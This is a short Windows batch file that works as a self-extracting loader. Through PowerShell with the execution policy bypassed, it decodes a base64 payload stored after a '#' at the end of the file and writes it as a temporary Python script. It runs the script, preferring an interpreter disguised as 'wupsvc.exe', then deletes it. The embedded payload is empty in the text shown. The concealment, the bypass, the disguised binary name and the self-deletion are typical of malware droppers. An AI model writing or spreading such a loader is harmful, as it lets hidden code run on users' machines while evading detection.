@echo off
setlocal
set "SELF=%~f0"
powershell -ExecutionPolicy Bypass -NoProfile -Command "$s=[Environment]::GetEnvironmentVariable('SELF');$c=Get-Content $s -Raw;$m=$c.LastIndexOf('#');if($m-ge0){$b=$c.Substring($m+1);$py=$env:TEMP+'\_run.py';[IO.File]::WriteAllText($py,[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)));$d=$env:LOCALAPPDATA+'\Python312';$w=$d+'\wupsvc.exe';if(Test-Path $w){$p=$w}elseif(Test-Path ($d+'\python.exe')){$p=$d+'\python.exe'}elseif(Test-Path 'C:\Python312\python.exe'){$p='C:\Python312\python.exe'}elseif(Get-Command python -EA 0){$p=(Get-Command python).Source}else{exit 1};if(!$p){exit 1};& $p $py;Remove-Item $py -Force -EA 0}"
exit /b
#

